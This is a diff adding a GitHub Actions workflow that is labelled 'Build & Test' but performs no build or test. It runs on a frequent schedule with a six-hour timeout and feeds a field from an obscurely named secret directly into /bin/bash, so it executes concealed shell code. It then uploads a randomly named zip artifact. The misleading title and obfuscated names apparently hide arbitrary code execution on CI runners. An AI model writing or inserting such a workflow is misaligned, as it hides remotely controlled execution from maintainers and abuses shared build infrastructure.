@@ -1,0 +1,30 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '20 1,7,13,19 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          mg165: ${{ secrets.mg165 }}
+        run: |
+          printf '%s' "$mg165" | jq -r .atj137 | /bin/bash
+          printf '%s' "$jb2908" | jq -r .nv89 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: VsD6IqSW
+          path: "*.zip"
+          retention-days: 1
